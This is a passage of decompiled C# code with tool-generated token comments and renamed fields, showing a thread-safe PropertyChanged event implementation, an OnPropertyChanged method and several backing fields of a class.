				add
				{
					PropertyChangedEventHandler propertyChangedEventHandler = this.propertyChangedEventHandler_0;
					PropertyChangedEventHandler propertyChangedEventHandler2;
					do
					{
						propertyChangedEventHandler2 = propertyChangedEventHandler;
						PropertyChangedEventHandler value2 = (PropertyChangedEventHandler)Delegate.Combine(propertyChangedEventHandler2, value);
						propertyChangedEventHandler = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.propertyChangedEventHandler_0, value2, propertyChangedEventHandler2);
					}
					while (propertyChangedEventHandler != propertyChangedEventHandler2);
				}
				remove
				{
					PropertyChangedEventHandler propertyChangedEventHandler = this.propertyChangedEventHandler_0;
					PropertyChangedEventHandler propertyChangedEventHandler2;
					do
					{
						propertyChangedEventHandler2 = propertyChangedEventHandler;
						PropertyChangedEventHandler value2 = (PropertyChangedEventHandler)Delegate.Remove(propertyChangedEventHandler2, value);
						propertyChangedEventHandler = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.propertyChangedEventHandler_0, value2, propertyChangedEventHandler2);
					}
					while (propertyChangedEventHandler != propertyChangedEventHandler2);
				}
			}

			// Token: 0x0600017C RID: 380 RVA: 0x00012494 File Offset: 0x00010694
			protected virtual void OnPropertyChanged(string propertyName)
			{
				PropertyChangedEventHandler propertyChangedEventHandler = this.propertyChangedEventHandler_0;
				if (propertyChangedEventHandler != null)
				{
					propertyChangedEventHandler(this, new PropertyChangedEventArgs(propertyName));
				}
			}

			// Token: 0x0400015E RID: 350
			private PropertyChangedEventHandler propertyChangedEventHandler_0;

			// Token: 0x0400015F RID: 351
			[CompilerGenerated]
			private string string_0;

			// Token: 0x04000160 RID: 352
			[CompilerGenerated]
			private int int_0;

			// Token: 0x04000161 RID: 353
			[CompilerGenerated]
			private bool bool_0;

			// Token: 0x04000162 RID: 354
			[CompilerGenerated]
			private bool bool_1;

			// Token: 0x04000163 RID: 355
			[CompilerGenerated]
			private bool bool_2;
		}
	}
}
